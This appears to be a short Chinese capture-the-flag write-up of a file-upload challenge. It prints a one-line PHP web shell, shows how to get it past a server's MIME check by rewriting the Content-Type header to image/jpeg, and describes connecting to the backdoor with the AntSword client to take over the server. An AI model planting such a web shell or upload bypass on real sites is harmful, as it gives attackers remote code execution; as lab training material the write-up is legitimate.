丢个木马上去

1

<?php @eval($_POST['Lyrio']);phpinfo();?> // phpinfo() 在这里充当标记的作用

看样子是被过滤了，查看页面源码，过滤代码不在前端而在后端

后端过滤代码是怎么个机制也不知道，只能用绕过的方法一个个去试

先尝试绕过 MIME 验证

由于一般是不会过滤图片文件的，BurpSuite 抓包，上传木马，将Content-Type: application/octet-stream改成Content-Type:image/jpeg

Content-Type：

  • image/jpeg ：jpg 图片格式
  • image/png ：png 图片格式
  • image/gif ：gif 图片格式
  • text/plain ：纯文本格式
  • text/xml ： XML 格式
  • text/html ： HTML 格式

直接绕过

记住木马文件上传的位置，访问一下看能不能执行

phpinfo() 执行了，@eval($_POST[‘Lyrio’]) 应该也执行了

用蚁剑连接后门

到这就算拿到服务器权限

找到并查看 flag.php

正常来说通过 getshell 拿到 flag 就行了(题目也是这个意思)，但是这个 flag 是错误的，真正的 flag 在 phpinfo 里， CTRL+F 搜索 flag 就能找到，这题有点过于绕了
